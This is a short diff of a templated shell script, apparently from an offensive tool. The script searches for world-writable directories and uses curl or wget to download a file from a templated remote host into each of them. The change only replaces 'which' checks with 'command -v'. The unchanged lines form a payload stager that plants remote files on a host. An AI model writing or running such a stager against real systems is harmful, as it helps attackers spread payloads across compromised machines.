@@ -8,9 +8,9 @@ for i in "~" "." $(find / -maxdepth 3 -type d \( -perm -o+w \)); do
         continue
     fi
 
-    if which curl >/dev/null; then
+    if command -v curl &> /dev/null; then
         curl {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}} -o "$i/{{.Name}}"
-    elif which wget >/dev/null; then
+    elif command -v  wget &> /dev/null; then
         wget -O "$i/{{.Name}}" {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}
     fi
 
